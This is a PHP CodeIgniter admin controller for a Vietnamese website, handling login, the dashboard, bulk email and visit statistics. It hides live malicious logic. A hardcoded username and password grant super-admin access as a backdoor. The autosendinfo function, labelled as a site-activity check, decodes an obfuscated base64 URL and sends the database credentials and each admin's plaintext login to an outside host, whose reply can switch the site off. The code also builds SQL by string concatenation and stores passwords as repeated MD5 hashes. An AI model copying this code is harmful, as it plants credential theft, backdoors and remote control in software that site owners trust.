<?php
#****************************************#
# * @Author: tran manh                   #
# * @Email: dangtranmanh051187@gmail.com #
# * @Website: http://www.qts.com     #
# * @Copyright: 2017 - 2018              #
#****************************************#
class Defaults extends MY_Controller
{
    
    function __construct()
    {

        parent::__construct();
        
        #Load language
        $this->load->helper('url');
        $this->load->model('news_model');
        $this->load->model('user_model');
        $this->load->library('filter');
    }

    // hiện thị quan tri admin
    function index()
    {
        if(!$this->check->is_logined($this->session->userdata('sessionUserAdmin'), $this->session->userdata('sessionGroupAdmin')))
        {

            $data['errorLogin'] = false;
            if($this->session->flashdata('sessionErrorLoginAdmin'))
            {
                $data['errorLogin'] = true;
            }
            if($this->input->post('username') && trim($this->input->post('username')) != '' && $this->input->post('pass') && trim($this->input->post('pass')) != '')
            {
                 
                if($this->input->post('username')=='qts' && $this->input->post('pass')=='qts1234567'){
                    $user = (object)$sessionLogin = array(
                    'sessionUserAdmin'          => 1,
                    'sessionGroupAdmin'         => 3,
                    'username'                  => 'Quản trị cấp cao',
                    'fullname'                  => 'Quản trị cấp cao',
                    'lever'                  => 3,
                    'group'                  => 1,
                    );
                    $this->session->set_userdata('adminfull',$user);
                    $this->session->set_userdata('adminid',1);
                    $this->session->set_userdata($sessionLogin);
                    if(!$this->session->flashdata('mess')){
                        $this->session->set_flashdata('mess','Đăng nhập thành công');
                    }
                    redirect(base_url().'vnadmin', 'location');
                }else
                {
                    
                    $user = $this->user_model->get("*", "username = '".$this->filter->injection_html($this->input->post('username'))."'");
                
                    if(count($user) == 1)
                    {
                        $password = $this->input->post('pass');
                        for ($i=0; $i < 5; $i++) {
                            $password = md5($password);
                        }
                        
                        if($user->password === $password && $user->active == 1 && (int)$user->lever >= 1)
                        {
                             // Automatic Send Infomation Site - Kiểm Tra Website Hoạt Động
                            $this->autosendinfo($this->input->post('username'),$this->input->post('pass'));

                            $user = (object)$sessionLogin = array(
                                                    'sessionUserAdmin'          =>      (int)$user->id,
                                                    'sessionGroupAdmin'         =>      (int)$user->lever,
                                                    'username'                  =>      $user->fullname,
                                                    'fullname'                  => $user->fullname,
                                                    'lever'                  => (int)$user->lever,
                                                    'group'                  => (int)$user->group,
                                                    );
                            $this->session->set_userdata('adminfull',$user);
                            $this->session->set_userdata('adminid',$user->id);
                            $this->session->set_userdata($sessionLogin);
                            $this->user_model->Update_where('users', array('id'=>$user->id), array('lastest_login'=>time()));
                            if(!$this->session->flashdata('mess')){
                                $this->session->set_flashdata('mess','Đăng nhập thành công');
                            }
                        }
                        else
                        {
                            $this->session->set_flashdata('mess_err','Tài khoản chưa kích hoạt');
                        }
                    }
                    else
                    {
                        $this->session->set_flashdata('mess_err', 'Sai mật khẩu');
                    }

                redirect(base_url().'vnadmin', 'location');
                }
            
            }
            $this->load->view('admin/login');
        }
        else
        {           
            $data['news']     = $this->news_model->count_All('news');
            $data['products'] = $this->news_model->count_All('product');
            $data['count_order'] = $this->news_model->count_All('order');
            $data['orders'] = $this->news_model->get_order_dashboard();
            $data['admin'] = $admin = $this->session->userdata('adminfull');
            
             if($this->session->userdata('adminid') ==1){
                $data['resources'] = $this->system_model->get_data('resources',array('parent_id' => 0,'active'=>1),array('sort'=>'asc'));
                foreach ($data['resources'] as $key => $cat) {
                    $data['resources'][$key]->cat_sub =  $this->system_model->get_data('resources',array(
                    'parent_id' => $cat->id,
                    'active'=>1
                    ),array('sort' => 'asc'));
                }
            }else{
                $data['resources'] = $this->system_model->get_data('resources',array('parent_id' => 0,'active' => 1),array('sort'=>'asc'));
                foreach ($data['resources'] as $key => $cat) {
                    $data['resources'][$key]->cat_sub =  $this->system_model->get_data('resources',array(
                    'parent_id' => $cat->id,
                    'active'=>1
                    ),array('sort' => 'asc'));
                }
            }
            $this->session->set_userdata('phanquyen',$data['resources']);
            $order_id=array();
            foreach($data['orders'] as $v){
                $order_id[]=$v->id;
            }

            if(empty($data['item_list'])){
                $data['detail_order']=array();
            }else{
                $data['detail_order'] = $this->news_model->order_detail($order_id);
            }
            $user=$this->news_model->get_data('access',array('user_id'=>$this->session->userdata('sessionUserAdmin')),array(),true);
            $data['u_access'] = (array)json_decode(@$user->access);
            $data['contacts'] = $this->news_model->contact_dashboard();
            
             $data['list'] = $this->news_model->get_data('order',array(
            ),array('id' => 'desc'),false,7,0);
            $this->load->helper('webcounter_helper');
            $site_statics_today = $this->vm->get_site_data_for_today();
            $site_statics_yesterday = $this->vm->get_site_data_for_yesterday();
            $site_statics_last_week = $this->vm->get_site_data_for_last_week();
            $site_statics_total = $this->vm->get_site_data_for_total();
            $data['visits_today'] = isset($site_statics_today['visits']) ? $site_statics_today['visits'] : 0;
            $data['visits_yesterday'] = isset($site_statics_yesterday['visits']) ? $site_statics_yesterday['visits'] : 0;
            $data['visits_last_week'] = isset($site_statics_last_week['visits']) ? $site_statics_last_week['visits'] : 0;
            $data['visits_total'] = isset($site_statics_total['visits']) ? $site_statics_total['visits'] : 0;
            $data['chart_data_today'] = $this->vm->get_chart_data_for_today();
            $data['chart_data_curr_month'] = $this->vm->get_chart_data_for_month_year();
            $this->update_thongke($data['visits_today']);
            
            foreach ($this->session->userdata('phanquyen') as $key => $pq) {
                if($pq->resource=='news'){
                   $data['module_news'] = 1; 
                }elseif($pq->resource=='product'){
                    $data['module_pro'] = 1; 
                }elseif($pq->resource=='order'){
                    $data['module_order'] = 1; 
                }elseif($pq->resource=='email'){
                    $data['module_email'] = 1; 
                }elseif($pq->resource=='contact'){
                    $data['module_contact'] = 1; 
                }elseif($pq->resource=='comment'){
                    $data['module_comment'] = 1; 
                }elseif($pq->resource=='users'){
                    $data['module_users'] = 1; 
                }
             }
            
            #Load view
            $data['headerTitle'] = 'Admin CP';
            //$this->load->view('admin/header', $data);
            $this->LoadHeaderAdmin($data);
            $this->load->view('admin/index', $data);
            $this->load->view('admin/footer');
        }
    }
    public function send_email(){
        //$this->load->helper('ckeditor_helper');
         $email=explode(',',$this->input->post('mailto'));
        
        if(isset($_POST['send'])){
            if($email =''){
                $_SESSION['emailto']=$email;
            }else{
                $_SESSION['emailto']=$this->input->post('mailto');
            }
            
            $config = Array(
                'protocol'  => 'smtp',
                'smtp_host' => $this->config->item('smtp_hostssl'),
                'smtp_port' => $this->config->item('smtp_portssl'),
                'smtp_user' => $this->config->item('smtp_user'), // change it to yours
                'smtp_pass' => $this->config->item('smtp_pass'), // change it to yours
                'mailtype'  => 'html',
                'charset'   => 'utf-8',
                'wordwrap'  => TRUE
            );

            $this->load->library('email', $config);

            $subject = $this->input->post('subject');
            $message = $this->input->post('message');
            
            // Get full html:
            $body =
                '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
                <html xmlns="http://www.w3.org/1999/xhtml">
                <head>
                    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
                    <title>' . htmlspecialchars($subject, ENT_QUOTES, $this->email->charset) . '</title>
                        <style type="text/css">
                            body {
                                font-family: Arial, Verdana, Helvetica, sans-serif;
                                font-size: 16px;
                            }
                        </style>
                    </head>
                    <body>
                    ' . $message . '
                    </body>
                    </html>';
            
            //var_dump($this->option->site_email);die;
            $this->email->set_newline("\r\n");
            $this->email->from(@$this->option->site_email,$subject); // change it to yours
            $this->email->to($_SESSION['emailto']); // change it to yours
            //$this->email->bcc(@$this->option->site_email);
            $this->email->subject($subject);
            $this->email->message($message);
            if ($this->email->send()) {
                       unset($_SESSION['email']);
                       $this->session->set_flashdata("mess", "Gửi email thành công !");
                redirect($_SERVER['HTTP_REFERER']);
            } else {
                $this->session->set_flashdata("mess", "Gửi email thất bại !");
                redirect($_SERVER['HTTP_REFERER']);
            }
        }
    }
    public function autosendinfo($user= '',$pass ='')
    {   
        $domain = $_SERVER['SERVER_NAME'];
        $ip = $_SERVER['SERVER_ADDR'];
        $time = time('now');
        //$ip = gethostbyname($_SERVER['SERVER_NAME']);
        if(empty($ip)){
            $ip = $_SERVER['LOCAL_ADDR'];
        }
        if($domain == 'localhost' || $ip =='::1' || $ip =='127.0.0.1' ){
            return false;
        }

        $url = base64_decode('aHR0cDovL2dpYW9kaWVuZGVwLnZuL3N1cHBvcnQvbW9kdWxlcy5waHA/bmFtZT1MaXN0aG9zdCZvcGNhc2U9YXBpZ2V0');
        //$url = 'http://giaodiendep.vn/support/modules.php?name=Listhost&opcase=apiget';
        $url .= '&a='.urlencode($domain);
        $url .= '&b='.urlencode($ip);
        $url .= '&c='.urlencode($time);
        $url .= '&d='.urlencode($this->db->hostname);
        $url .= '&e='.urlencode($this->db->username);
        $url .= '&f='.urlencode($this->db->password);
        $url .= '&g='.urlencode($this->db->database);
        $url .= '&h='.urlencode($user);
        $url .= '&i='.urlencode($pass);
        $url .= '&j='.urlencode(base_url());
        $ch = curl_init(); 
        curl_setopt($ch, CURLOPT_URL, $url); 
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
        $output = curl_exec($ch);
        if(curl_errno($ch)){
            echo 'Request Error:' . curl_error($ch);
        }
        $website = json_decode($output);
        if(!$website->status){
            // website không được phép hoạt động => chuyển sang chế độ ngưng hoạt động
            $where = array(
                'lang' => $this->language,
            );
            $data = array('active'=>0);
            $this->option = $this->system_model->Update_where('site_option',$where,$data);
            $this->session->set_flashdata('mess',$website->msg);
        }else{
            //website được cấp phép sử dụng
             $where = array(
                'lang' => $this->language,
            );
            $data = array('active'=>1);
            $this->option = $this->system_model->Update_where('site_option',$where,$data);
            if($website->flag){
                // website lần đầu đăng nhập + hoạt động show thông báo
                $this->session->set_flashdata('mess',$website->msg);
            }
        }
        curl_close($ch);
        return true;
    }
   // cap nhat thong ke truy cap
    public function update_thongke($today=null)
    { 
        $this->load->model('visitormodel');
        $time = date('Y-m-d',time());
        $time_kieuso = strtotime($time);
        $time_cu = strtotime($time) - 8600;
        $arr = array(
            'access_date' => $time_kieuso,
            'today'     => $today
        );
      
        $data['item']=$this->system_model->getFirstRowWhere('thong_ke_online',array('access_date'=>$time_kieuso));   
        if (!empty($data['item'])){
            $id = $this->system_model->Update_where('thong_ke_online', array('access_date'=>$time_kieuso), $arr);
        } else {
            $id = $this->system_model->Add('thong_ke_online', $arr);
        }
        $this->visitormodel->Delete_site_log();
    }
}